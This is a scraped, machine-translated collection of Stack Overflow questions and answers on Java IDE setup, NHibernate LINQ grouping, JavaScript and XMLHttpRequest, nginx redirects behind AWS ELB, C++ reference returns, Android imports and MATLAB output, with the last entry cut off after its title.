**Eclipse:**

1.Right-click your Project.

2.Select Properties.

3.On the left-hand side click java build path.

4.Under Compile tab - click Add External Jars button.

**Netbeans :**

1.Right-click your Project.

2.Select Properties.

3.On the left-hand side click Libraries.

4.Under Compile tab - click Add Jar/Folder button.

or if you directly compiling classes without IDE you can do as @S.R.I mentioned in comment.

# c# - Linq 从 GroupBy 中选择

> ID：15847872
> 
> 赞同：1
> 
> 时间：2013-04-06T06:33:39.343
> 
> 标签：c#, linq

我想将每个组选择到自定义类中，将每个项目选择到另一个自定义类中，

我这样做是这样的：

```
_notificationsManager
    .GetUserNotifications(_repositoryNotifications, _memberShipProvider)
    .GroupBy(x => x.Category)
    .Select(g => new NotificationsGroupData {
          Name = g.Key,
          Notifications = g.Take(3).Select(s => new NotificationData  {
                                           Category = g.Key,
                                           Text = s.Text,
                                           Time = DateTime.Now.Subtract(s.Time)
                                         })
     }) 
```

这里是 NotificationsGroupData：

```
public class NotificationsGroupData
{
    public string Name { get; set; }
    public IEnumerable<NotificationData> Notifications { get; set; }
} 
```

和通知数据：

```
public class NotificationData
{
    public virtual TimeSpan Time { get; set; }
    public virtual string Category { get; set; }
    public virtual string Text { get; set; }
} 
```

但是当我试图创建循环时，我得到了错误：方法或操作没有实现。

在这条线上：

```
@foreach (var group in Model.Notifications) 
```

我该如何解决？

**Uodate：** 我将代码更新为：

```
_notificationsManager.GetUserNotifications(_repositoryNotifications, _memberShipProvider)
                                             .GroupBy(x => x.Category)
                                             .Select(g => new
                                                 {
                                                     Name = g.Key,
                                                     Notifications =
                                                              g.OrderBy(o => o.Time)
                                                               .Take(3)
                                                               .Select(s => new
                                                                   {
                                                                       Category = g.Key,
                                                                       s.Text,
                                                                       s.Time
                                                                   })
                                                 }).AsEnumerable().Select(g => new NotificationsGroupData
                                                     {
                                                         Name = g.Name,
                                                         Notifications = g.Notifications
                                                                          .Select(s => new NotificationData
                                                                              {
                                                                                  Category = g.Name,
                                                                                  Text = s.Text,
                                                                                  Time = now - s.Time
                                                                              })
                                                     }) 
```

这里是错误：

```
The method or operation is not implemented.

Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.NotImplementedException: The method or operation is not implemented.

Source Error: @foreach (var group in Model.Notifications)

Stack Trace: 

[NotImplementedException: The method or operation is not implemented.] NHibernate.Linq.GroupBy.NonAggregatingGroupByRewriter.FlattenSubQuery(SubQueryExpression subQueryExpression, QueryModel queryModel) +608    NHibernate.Linq.GroupBy.NonAggregatingGroupByRewriter.ReWrite(QueryModel queryModel) +598    NHibernate.Linq.Visitors.QueryModelVisitor.GenerateHqlQuery(QueryModel queryModel, VisitorParameters parameters, Boolean root) +126    NHibernate.Linq.NhLinqExpression.Translate(ISessionFactoryImplementor sessionFactory) +208    NHibernate.Hql.Ast.ANTLR.ASTQueryTranslatorFactory.CreateQueryTranslators(String queryIdentifier, IQueryExpression queryExpression, String collectionRole, Boolean shallow, IDictionary`2 filters, ISessionFactoryImplementor factory) +51    NHibernate.Engine.Query.HQLExpressionQueryPlan.CreateTranslators(String expressionStr, IQueryExpression queryExpression, String collectionRole, Boolean shallow, IDictionary`2 enabledFilters, ISessionFactoryImplementor factory) +100    NHibernate.Engine.Query.HQLExpressionQueryPlan..ctor(String expressionStr, IQueryExpression queryExpression, String collectionRole, Boolean shallow, IDictionary`2 enabledFilters, ISessionFactoryImplementor factory) +74    NHibernate.Engine.Query.HQLExpressionQueryPlan..ctor(String expressionStr, IQueryExpression queryExpression, Boolean shallow, IDictionary`2 enabledFilters, ISessionFactoryImplementor factory) +53  NHibernate.Engine.Query.QueryPlanCache.GetHQLQueryPlan(IQueryExpression queryExpression, Boolean shallow, IDictionary`2 enabledFilters) +320   NHibernate.Impl.AbstractSessionImpl.GetHQLQueryPlan(IQueryExpression queryExpression, Boolean shallow) +188    NHibernate.Impl.AbstractSessionImpl.CreateQuery(IQueryExpression queryExpression) +164    NHibernate.Linq.DefaultQueryProvider.PrepareQuery(Expression expression, IQuery& query, NhLinqExpression& nhQuery) +152    NHibernate.Linq.DefaultQueryProvider.Execute(Expression expression)
+70    NHibernate.Linq.DefaultQueryProvider.Execute(Expression expression) +59    Remotion.Linq.QueryableBase`1.GetEnumerator() +128  System.Linq.WhereSelectEnumerableIterator`2.MoveNext() +61    ASP._Page_Views_Layout_Notifications_cshtml.Execute() in d:\Dev\Projects\ADDE\ADDE\Views\Layout\Notifications.cshtml:21    System.Web.WebPages.WebPageBase.ExecutePageHierarchy() +197    System.Web.Mvc.WebViewPage.ExecutePageHierarchy() +103    System.Web.WebPages.WebPageBase.ExecutePageHierarchy(WebPageContext pageContext, TextWriter writer, WebPageRenderingBase startPage) +88    System.Web.Mvc.RazorView.RenderView(ViewContext viewContext, TextWriter writer, Object instance) +235    System.Web.Mvc.BuildManagerCompiledView.Render(ViewContext viewContext, TextWriter writer) +107    System.Web.Mvc.ViewResultBase.ExecuteResult(ControllerContext context)
+291    System.Web.Mvc.ControllerActionInvoker.InvokeActionResult(ControllerContext controllerContext, ActionResult actionResult) +13    System.Web.Mvc.<>c__DisplayClass1a.<InvokeActionResultWithFilters>b__17()
+23    System.Web.Mvc.ControllerActionInvoker.InvokeActionResultFilter(IResultFilter filter, ResultExecutingContext preContext, Func`1 continuation) +245   System.Web.Mvc.<>c__DisplayClass1c.<InvokeActionResultWithFilters>b__19()
+22    System.Web.Mvc.ControllerActionInvoker.InvokeActionResultWithFilters(ControllerContext controllerContext, IList`1 filters, ActionResult actionResult) +176    System.Web.Mvc.Async.<>c__DisplayClass2a.<BeginInvokeAction>b__20()
+75    System.Web.Mvc.Async.<>c__DisplayClass25.<BeginInvokeAction>b__22(IAsyncResult asyncResult) +99    System.Web.Mvc.Async.WrappedAsyncResult`1.End()
+50    System.Web.Mvc.Async.AsyncControllerActionInvoker.EndInvokeAction(IAsyncResult asyncResult) +27    System.Web.Mvc.<>c__DisplayClass1d.<BeginExecuteCore>b__18(IAsyncResult asyncResult) +14    System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.Controller.EndExecuteCore(IAsyncResult asyncResult) +39 System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.Controller.EndExecute(IAsyncResult asyncResult) +29    System.Web.Mvc.Controller.System.Web.Mvc.Async.IAsyncController.EndExecute(IAsyncResult asyncResult) +10    System.Web.Mvc.<>c__DisplayClass8.<BeginProcessRequest>b__3(IAsyncResult asyncResult) +25    System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.MvcHandler.EndProcessRequest(IAsyncResult asyncResult)
+31    System.Web.Mvc.MvcHandler.System.Web.IHttpAsyncHandler.EndProcessRequest(IAsyncResult result) +9    System.Web.Mvc.<>c__DisplayClassa.<EndProcessRequest>b__9() +22    System.Web.Mvc.<>c__DisplayClass4.<Wrap>b__3() +10    System.Web.Mvc.ServerExecuteHttpHandlerWrapper.Wrap(Func`1 func) +27   System.Web.Mvc.ServerExecuteHttpHandlerWrapper.Wrap(Action action) +64 System.Web.Mvc.ServerExecuteHttpHandlerAsyncWrapper.EndProcessRequest(IAsyncResult result) +71    System.Web.HttpServerUtility.ExecuteInternal(IHttpHandler handler, TextWriter writer, Boolean preserveForm, Boolean setPreviousPage, VirtualPath path, VirtualPath filePath, String physPath, Exception error, String queryStringOverride) +1464

[HttpException (0x80004005): Error executing child request for handler 'System.Web.Mvc.HttpHandlerUtil+ServerExecuteHttpHandlerAsyncWrapper'.] System.Web.HttpServerUtility.ExecuteInternal(IHttpHandler handler, TextWriter writer, Boolean preserveForm, Boolean setPreviousPage, VirtualPath path, VirtualPath filePath, String physPath, Exception error, String queryStringOverride) +3033503    System.Web.HttpServerUtility.Execute(IHttpHandler handler, TextWriter writer, Boolean preserveForm, Boolean setPreviousPage) +76    System.Web.HttpServerUtility.Execute(IHttpHandler handler, TextWriter writer, Boolean preserveForm) +28    System.Web.HttpServerUtilityWrapper.Execute(IHttpHandler handler, TextWriter writer, Boolean preserveForm) +19    System.Web.Mvc.Html.ChildActionExtensions.ActionHelper(HtmlHelper htmlHelper, String actionName, String controllerName, RouteValueDictionary routeValues, TextWriter textWriter) +463    System.Web.Mvc.Html.ChildActionExtensions.RenderAction(HtmlHelper htmlHelper, String actionName, String controllerName) +35    ASP._Page_Views_Shared__Layout_cshtml.Execute() in d:\Dev\Projects\ADDE\ADDE\Views\Shared\_Layout.cshtml:33    System.Web.WebPages.WebPageBase.ExecutePageHierarchy() +197    System.Web.Mvc.WebViewPage.ExecutePageHierarchy() +103    System.Web.WebPages.WebPageBase.ExecutePageHierarchy(WebPageContext pageContext, TextWriter writer, WebPageRenderingBase startPage) +88    System.Web.WebPages.<>c__DisplayClass7.<RenderPageCore>b__6(TextWriter writer) +233    System.Web.WebPages.HelperResult.WriteTo(TextWriter writer) +10    System.Web.WebPages.WebPageBase.Write(HelperResult result) +71    System.Web.WebPages.WebPageBase.RenderSurrounding(String partialViewName, Action`1 body) +64    System.Web.WebPages.WebPageBase.PopContext() +246    System.Web.WebPages.WebPageBase.ExecutePageHierarchy(WebPageContext pageContext, TextWriter writer, WebPageRenderingBase startPage) +95    System.Web.Mvc.RazorView.RenderView(ViewContext viewContext, TextWriter writer, Object instance) +235    System.Web.Mvc.BuildManagerCompiledView.Render(ViewContext viewContext, TextWriter writer) +107    System.Web.Mvc.ViewResultBase.ExecuteResult(ControllerContext context)
+291    System.Web.Mvc.ControllerActionInvoker.InvokeActionResult(ControllerContext controllerContext, ActionResult actionResult) +13    System.Web.Mvc.<>c__DisplayClass1a.<InvokeActionResultWithFilters>b__17()
+23    System.Web.Mvc.ControllerActionInvoker.InvokeActionResultFilter(IResultFilter filter, ResultExecutingContext preContext, Func`1 continuation) +245   System.Web.Mvc.<>c__DisplayClass1c.<InvokeActionResultWithFilters>b__19()
+22    System.Web.Mvc.ControllerActionInvoker.InvokeActionResultWithFilters(ControllerContext controllerContext, IList`1 filters, ActionResult actionResult) +176    System.Web.Mvc.Async.<>c__DisplayClass2a.<BeginInvokeAction>b__20()
+75    System.Web.Mvc.Async.<>c__DisplayClass25.<BeginInvokeAction>b__22(IAsyncResult asyncResult) +99    System.Web.Mvc.Async.WrappedAsyncResult`1.End()
+50    System.Web.Mvc.Async.AsyncControllerActionInvoker.EndInvokeAction(IAsyncResult asyncResult) +27    System.Web.Mvc.<>c__DisplayClass1d.<BeginExecuteCore>b__18(IAsyncResult asyncResult) +14    System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.Controller.EndExecuteCore(IAsyncResult asyncResult) +39 System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.Controller.EndExecute(IAsyncResult asyncResult) +29    System.Web.Mvc.Controller.System.Web.Mvc.Async.IAsyncController.EndExecute(IAsyncResult asyncResult) +10    System.Web.Mvc.<>c__DisplayClass8.<BeginProcessRequest>b__3(IAsyncResult asyncResult) +25    System.Web.Mvc.Async.<>c__DisplayClass4.<MakeVoidDelegate>b__3(IAsyncResult ar) +23    System.Web.Mvc.Async.WrappedAsyncResult`1.End() +55    System.Web.Mvc.MvcHandler.EndProcessRequest(IAsyncResult asyncResult)
+31    System.Web.Mvc.MvcHandler.System.Web.IHttpAsyncHandler.EndProcessRequest(IAsyncResult result) +9    System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+9629708    System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) +155 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T07:06:10.180

我怀疑问题很可能出在`DateTime.Now.Subtract(s.Time)`其中，可能与您对`NotificationsGroupData`.

我建议您将查询更改为简单地获取您需要的所有数据而不进行太多处理，然后在本地使用`AsEnumerable`. 所以像：

```
// Use a single common idea of "now", don't re-evaluate each time
var now = DateTime.Now;
var query = _notificationsManager
    .GetUserNotifications(_repositoryNotifications, _memberShipProvider)
    .GroupBy(x => x.Category)
    .Select(g => new {
      Name = g.Key,
      Notifications = g.Take(3)
                       .Select(s => new {
                           Text = s.Text,
                           Time = s.Time
                       })
    })
    .AsEnumerable() // Force local evaluation for final step
    .Select(g => new NotificationsGroupData {
      Name = g.Name,
      Notifications = g.Notifications
                       .Select(s => new NotificationData {
                           Category = g.Name,
                           Text = s.Text,
                           Time = now - s.Time
                       })
    }); 
```

编辑：好的，因为这仍然存在问题，您可以尝试在进程中进行分组后的*所有操作：*

```
var now = DateTime.Now;
var query = _notificationsManager
    .GetUserNotifications(_repositoryNotifications, _memberShipProvider)
    .GroupBy(x => x.Category)
    .AsEnumerable() // Force local evaluation for final step
    .Select(g => new NotificationsGroupData {
      Name = g.Key,
      Notifications = g.Take(3)
                       .Select(s => new NotificationData {
                           Category = g.Key,
                           Text = s.Text,
                           Time = now - s.Time
                       })
    }); 
```

请注意，这远非想法 - 它会从数据库中提取所有属性，而不仅仅是您想要的属性。（不仅是前三个——虽然“第一个”也取决于顺序，但在我们可以看到的任何地方都没有指定。）这可能是您需要回退到 SQL 的情况之一，但听起来 NHibernate 可以为你做更多的事情......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T08:08:18.470

NHibernate 无法将您的查询转换为 sql。最快的解决方案是在内存集合上做出选择声明，而不是将其传递给 NHibernate。试试这个：

```
_notificationsManager
    .GetUserNotifications(_repositoryNotifications, _memberShipProvider)
    .GroupBy(x => x.Category)
    .ToList()
    .Select(g => new NotificationsGroupData {
          Name = g.Key,
          Notifications = g.Take(3).Select(s => new NotificationData  {
                                           Category = g.Key,
                                           Text = s.Text,
                                           Time = DateTime.Now.Subtract(s.Time)
                                         })
     }) 
```

另一个选择是在 HQL\SQL 上编写您的查询并将其传递给 NHibernate，因此您将从数据库中提取必要数量的数据，然后将其映射到您的自定义实体。

# javascript - JavaScript 打印整个数组而不是单个元素

> ID：15847879
> 
> 赞同：1
> 
> 时间：2013-04-06T06:35:02.553
> 
> 标签：javascript, arrays

```
var input = document.querySelector("input");
var button = document.querySelector("button");
var inventory = ["jacket","pants","map"];
var actionsIKnow = ["north","east","west","south"];
var messages = ["A group of dangerous minions. Turn back, you do not have a sword",
  "You have gone too deep into the forest. Want to go further?",
  "A giant ruby crystal",
  "A silent lake; you see your reflection in the water",
  "Clear patch of land",
  "A sleeping dragon. Bettwe not wake it up",
  "A solitary cottage. Faint music can be heard from the inside",
  "Looks like this path leads to the cottage of the flute maker",
  "A lot of tombstones, looks like an old graveyard"
];

var userInput;
var startingPos = 4;

button.addEventListener("click",takeMeThere,false);

function takeMeThere(){
  userInput = input.value;
  userInput = userInput.toLowerCase();
  if(userInput!=null){
    validateInput();
  }
}
function validateInput(){
  for(var i=0;i<actionsIKnow.length;i++){
    if(userInput.indexOf(actionsIKnow[i]!=-1)){
      move(actionsIKnow[i]);
    }
  }
}
function move(where){
  console.log(where);
} 
```

我正在制作一个基于文本的探索游戏，用户可以在其中选择去哪里。用户想去的地方取决于在文本字段中输入的内容。然后将此数据传递到`move(where)`I 所在的位置`console.log(where)`。它不是打印北、东等，而是打印整个`actionsIKnow`数组。为什么 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:40:39.447

简单的错误。改变

```
if(userInput.indexOf(actionsIKnow[i]!=-1)){ 
```

对此：

```
if (userInput.indexOf(actionsIKnow[i]) !== -1 ) { 
```

[http://jsfiddle.net/bz8k5/](http://jsfiddle.net/bz8k5/)

*编辑。根据评论中的讨论。*为了能够以不同的格式验证输入，例如向东移动，向东移动，但不允许复活节，您可能还需要使用更复杂的验证规则。也许使用正则表达式：

```
if (userInput.match(new RegExp("\\b" + actionsIKnow[i] + "\\b"))) {
    move(actionsIKnow[i]);
} 
```

[http://jsfiddle.net/bz8k5/2/](http://jsfiddle.net/bz8k5/2/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T06:43:27.237

仔细看这行代码：

```
if(userInput.indexOf(actionsIKnow[i]!=-1)){ 
```

让我们添加空格以使其更易于查看：

```
if( userInput.indexOf( actionsIKnow[i]!=-1 ) ) { 
```

看到了吗？让我们把空格变成换行符和缩进：

```
if(
    userInput.indexOf(
        actionsIKnow[i] != -1
    )
) { 
```

现在你看到问题了吗？:-)

无论如何，您在这里的真正意思可能很简单：

```
if( userInput == actionsIKnow[i] ) { 
```

或者，正如@nnnnnn 建议的那样，您可以使用`.indexOf()` *而不是*自己的循环，如下所示：

```
function validateInput(){
    if( actionsIKnow.indexOf(userInput) >= 0  ) {
        move( userInput );
    }
} 
```

但要注意一个问题：`.indexOf()`在 IE8 及更早版本的 IE 中不提供 on an array。如果您需要支持 IE8，这将不起作用。

所以这是我最喜欢的方法：使用对象查找而不是数组。

更改`actionsIKnow`为：

```
var actionsIKnow = { north:1, east:1, west:1, south:1 }; 
```

然后更改`validateInput()`为：

```
function validateInput(){
    if( userInput in actionsIKnow ) {
        move( userInput );
    }
} 
```

这适用于所有浏览器，如果 中有大量项目`actionsIKnow`，则此对象查找将比`.indexOf()`. 对于少数项目，性能无关紧要，但我认为`in`操作员可以提供最好的阅读代码。

这是一个比较大量字符串之间的性能的[jsperf 。](http://jsperf.com/object-lookup-vs-indexof)`.indexOf()``in`

# javascript - 如何使用 xmlhttp 请求发送原始文本？

> ID：15847882
> 
> 赞同：3
> 
> 时间：2013-04-06T06:35:13.710
> 
> 标签：javascript, ajax, xmlhttprequest

我正在尝试`textarea`使用 ajax 将字段的文本发送到 PHP 文件，该文本包含 HTML 字符并且不应该被编码。
使用`FormData`它可以完美运行，但 ie 9 和更早的版本不支持它！我试图`string`通过设置`requestHeader`to `text/plain;charset=UTF-8;`or来发送数据，`multipart/form-data`但它没有用！我正在使用的代码是：

```
var string = '<td clas="tdClass">some text<?php echo $contents; ?></td>';

var data = new FormData();
data.append("data" , string);
var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
xhr.open( 'post', '/path/to/php', true );
xhr.send(data); 
```

在 IE 9 中执行此操作的另一种方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-08-23T19:22:52.820

如果 using`FormData`适合您，那么在您无法使用它的情况下，实际上您需要做的就是将最后一行替换为：

```
xhr.send("data="+encodeURIComponent(string)); 
```

我认为其他回答者对您要求文本“未编码”感到困惑。表单数据通常被编码以通过 HTTP 发送，但当它到达服务器时由 PHP*解码，**完全透明*：无论它可能包含什么特殊字符，您都可以*准确地返回原始文本。*（假设您将 PHP 字符串解释为 UTF-8）。

因此，按照您的示例，如果您的 PHP 文件包含：

```
$data = $_POST['data']; 
```

那么 PHP`$data`变量的内容就是字符串`'<td clas="tdClass">some text<?php echo $contents; ?></td>'`。这与您使用该`FormData`方法相同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T10:22:04.303

是的，它可以通过修改来完成`headerRequest`，`data`如下所示：

```
var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");

if(typeof(FormData) == 'undefined'){
    var boundary = '---------------------------' + (new Date).getTime(),//boundary is used to specify the encapsulation boundary of a parameter
        data = "--" + boundary + "\r\n";
        data += 'Content-Disposition: form-data; name="data"\r\n\r\n';//here we specify the name of the parameter name (data) sent to the server which can be retrieved by $_POST['data']
        data += string + "\r\n";
        data += "--" + boundary + "--\r\n";
    xhr.open( 'post', 'writeCode.php', true );
    xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
}else{
    var data = new FormData();
    data.append("data", string);
    xhr.open( 'post', 'writeCode.php', true );
}
xhr.send(data); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-28T21:10:06.190

因为，好吧，它毕竟看起来很简单。这是更多示例。

随便发个文字

```
// just text
var dest = "http://requestb.in/qwb9y3qw";

var xhr = new XMLHttpRequest();
xhr.open("POST", dest, true);

var myText = "foobar";
xhr.send(myText);
```

发布 JSON 对象

```
// post json
var dest = "http://requestb.in/1908jrv1";

var xhr = new XMLHttpRequest();
xhr.open("POST", dest, true);

var myObject = {};
myObject.prop1 = "foo";
myObject.prop2 = "bar";
xhr.send(JSON.stringify(myObject));
```

# ios - popViewControllerAnimated：导致视图无响应

> ID：15847884
> 
> 赞同：2
> 
> 时间：2013-04-06T06:35:29.423
> 
> 标签：ios, uinavigationcontroller, uitabbarcontroller, containers

我曾多次使用导航控制器，但从未遇到过这种情况。

我有我的根视图控制器，它是一个自定义构建的容器控制器，底部有一个标签栏，位于导航控制器内。由于各种原因，我不得不构建一个自定义容器……无论如何……我单击其中一个单元格中的图像，然后推送详细视图。（由于各种原因，我没有使用 didselectrowatindexpath，该应用程序知道由于注册这些触摸的委托而在单元格上单击了图像）。

然后在详细视图上有一个关闭按钮，我单击它并执行popViewControllerAnimated：这一切都很好，一旦弹出视图，就会显示开始（推动详细视图的人）视图控制器。唯一的问题是现在我无法处理屏幕上的任何触摸。就好像应用程序被冻结并在弹出视图后就坐在那里。我错过了什么吗？我假设您对导航控制器所要做的只是推送和弹出。没有代表或类似的东西。感谢您的帮助！

# nginx - 非 www 到 www 使用 AWS Elastic Load balancer 和 Nginx

> ID：15847888
> 
> 赞同：4
> 
> 时间：2013-04-06T06:35:48.307
> 
> 标签：nginx, amazon-web-services, amazon-ec2, ubuntu-12.04, http-redirect

我有一个在 example.com 上运行的应用程序，现在我想将所有流量重定向到 www.example.com，因为我们正在为您的网站与 Akamai 的 CDN 合作。我的域停在 Route53 中，将 Elastic Load Balancer 的 CNAME 的 CNAME 添加到指向 *.example.com 并且我正在运行具有以下配置的 nginx Web 服务器。如果我使用此配置，ELB 会抛出实例，现在 domain.com 工作正常，www.domain.com 工作正常，但不会发生重定向。

```
server {
        listen 80;
        server_name example.com;
#       rewrite ^    http://www.example.com$request_uri? permanent;
        root /home/ubuntu/apps/st/public;
        passenger_enabled on;
} 
```

但我无法实现重定向。

还尝试添加值为负载均衡器的 cname 的 PTR。

尝试更改nginx配置，如您所见

`rewrite ^ http://www.example.com$request_uri? permanent`;

即使这样也行不通。

一旦我添加了上面的行，应用程序实例就会消失，ELB 就会从堆栈中抛出。

解决方案是什么，我从 3-4 天开始一​​直在努力实现这一目标，现在它变成了一场噩梦，请帮助我。我还在 aws 论坛中发布了帖子和主题，没有任何帮助。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-08-26T14:40:26.133

我在重定向时遇到了同样的问题（使用相同的 nginx conf 代码，如此处所示）。

然后，我将重定向配置作为最后一个 server{} 块（在我的 domain.com 配置文件的末尾），ELB 能够再次找到实例。

我没有进一步研究它，但似乎 vhost 处理是按顺序完成的，所以当 ELB 访问我的服务器的 IP 地址时，它会落在第一个定义的 server{} 块上，在我的例子中是重定向。Nginx 抛出 301 返回码，ELB 吓坏了，因为它不是 200。

不过只是猜测。

所以，我的配置（真正的虚拟主机在上面，重定向是最后的）：

> 少 /etc/nginx/sites-enabled/domain.com

```
server {
    listen 80;
    server_name domain.com;
    .....
}

server {
    listen       80;
    server_name  www.domain.com;
    return       301 http://domain.com$request_uri;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T16:17:24.960

我不熟悉 Amazon ELB，但也许我可以在 nginx 部分提供帮助。

对于您的场景，我通常在 nginx 中使用两个服务器块。一个处理重写/重定向（example.com），另一个处理常规站点（www.example.com）。两个块可以在同一个文件中。

```
# for redirecting only...
server {
    listen 80;
    server_name example.com;

    # re-written to www...
    location / {
       rewrite ^(.*)$ $scheme://www.example.com$1 permanent;
    }
}

# regular web site config here...
server {
    listen 80;
    server_name www.example.com;

    root /home/ubuntu/apps/st/public;
    passenger_enabled on;
    ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-22T19:32:16.807

老问题，但因为它出现在搜索中。

现在可以使用 AWS 应用程序负载均衡器重定向到 www（或任何其他主机）。这可能比使用 nginx 配置更方便管理。

[https://docs.aws.amazon.com/elasticloadbalancing/latest/application/listener-update-rules.html](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/listener-update-rules.html)

# c++ - 返回引用与返回值 C++ 之间的区别

> ID：15847889
> 
> 赞同：4
> 
> 时间：2013-04-06T06:36:08.863
> 
> 标签：c++, reference

关于为什么有必要从函数返回引用的问题。

`int&`如果我们在第 9 行和第 16 行中替换为，则以下代码的行为完全相同`int`。

在我的示例代码中是否如此，返回引用与值无关紧要？在什么样的例子中它会开始变得重要？

在我看来，我们不能返回函数的局部变量的引用，因为局部变量将超出调用者的范围。因此，仅返回调用者可以看到的变量的引用（在范围内）才有意义，但是如果函数的调用者可以看到该变量，则不需要返回（？）（或者这是返回为了保持代码整洁而完成？）

相关链接：[返回参考是个好主意吗？](https://stackoverflow.com/questions/13077979/is-returning-a-reference-ever-a-good-idea)

```
#include <iostream>
using namespace std;

class myClass{
private:
    int val;
public:
    myClass(int);
    int& GetVal();
};

myClass::myClass(int x){
    val = x;
}

int& myClass::GetVal(){
    return val;
}

int main()
{
    myClass myObj(666);
    cout << myObj.GetVal() << endl;
    system("pause");
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T06:38:53.563

不同之处在于，当您返回引用时，您可以分配给结果`GetVal()`：

```
myObj.GetVal() = 42; 
```

您还可以保留返回的引用，并在`myObj.val`以后使用它进行修改。

如果按值`GetVal()`返回`val`，这一切都不可能。

这是否是可取的，或者确实是好的设计，完全是一个不同的问题。

[请注意，您的示例与链接问题](https://stackoverflow.com/questions/13077979/is-returning-a-reference-ever-a-good-idea)中的代码非常不同——该代码返回无效引用，这无疑是一个坏主意。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T06:39:18.147

在这种情况下，不同之处在于通过引用返回允许调用者通过为其分配值来修改数据成员，而通过值返回仅返回调用者变量的副本。

首先允许您编写：

```
myObj.GetVal() = 100; 
```

而后者没有。

请注意，第一种方式允许函数的调用者获取对`private`数据成员的引用，并且他们可以随意修改它。对我来说，这是我想避免的事情。我不希望我班级的用户随意更改班级成员的状态。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T06:39:19.960

除非您返回这样的参考代码，否则将是非法的

```
int main()
{
    myClass myObj(666);
    myObj.GetVal() = 777;
    return 0;
} 
```

所以一个重要的问题是你是否希望这样的代码是合法的。在这种情况下，我会说不是，但其他情况可能会有所不同。

对于您的另一点，您几乎是对的，但这与用户是否可以*看到*变量无关，而与变量的*生命周期*有关。用户可能看不到变量（例如它可能是私有的），但只要变量仍然存在，那么返回对它的引用就不是错误。

对于复杂的对象，还有一个问题是您是要*复制*对象还是返回对*原始*对象的引用。然而，这不太可能是简单类型的问题`int`。

# android - 导入安卓项目

> ID：15847897
> 
> 赞同：0
> 
> 时间：2013-04-06T06:37:28.950
> 
> 标签：android, import

当我导入一个已经存在的 Android 项目时，我有时会遇到问题......我有错误：“项目没有目标集。编辑项目属性以设置一个。” “/projectName/AndroidManifest.xml 的解析器异常：文件过早结束。” 我所有的文件（.java、布局、清单等）都是空的！！！

请告诉我正确导入Android项目的确切方法是什么。

谢谢，

ñ

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-04T23:08:52.397

这些答案应该可以解决问题，我建议您尝试清理项目并从项目>清理和项目>构建项目中重建它。我希望这会有所帮助。

*如果构建项目不可点击，自动从构建中删除勾号，这将启用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:41:46.593

尝试：文件 -> 导入 -> Android -> 现有代码

![在此处输入图像描述](https://i.stack.imgur.com/2zgV4.png)

并将项目复制到工作区

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:42:36.270

你必须把它放到你的主祭中

```
target=android-8 
```

还可以查看[如何将现有的 Android 项目导入 Eclipse？](https://stackoverflow.com/questions/2231474/how-to-import-existing-android-project-into-eclipse)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-28T12:49:49.880

当我尝试将项目导入工作集时，我也遇到了这个编译错误。而我所做的 - 我意识到当您尝试导入项目时必须有一个空的工作区。

因此，无需将您的项目放入您的工作区。只需为 Workspace 创建一个空文件夹，然后导入。真的，我读过上面推荐的 William Kinaan。

# linux - 如何使用 fprintf 在 matlab 中多次将字符输出到文件

> ID：15847898
> 
> 赞同：0
> 
> 时间：2013-04-06T06:37:30.830
> 
> 标签：linux, matlab, for-loop, octave, printf

迎接大家

我正在尝试根据 for 循环的长度多次将字符（括号） **')'输出到文件中。**例子：

```
num1=23;
for i=1 length(array) 
     fprintf(fid,strcat(num2str(num1)),')')
end 
```

输出到文件将是**23))))))**

数组的长度是 6 它应该打印 6 括号**))))))**到文件

我在 linux 上使用 octave/matlab。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T08:40:53.257

使用 repmat，例如：`string = repmat(')',1,6)`将生成`))))))`并将其存储在 variable 中`string`。然后您可以将此字符串附加`fprintf`到文件中。

```
string = repmat(')',1,6)
fprintf(fid,[num2str(num1) string]) 
```

顺便说一句，matlab 中的字符串连接使用：`str = ['str1' 'str2' 'str3']`比 strcat 做得更好。

# php - PHP - 使用键 LIKE 将项目从数组移动到数组

> ID：15847901
> 
> 赞同：0
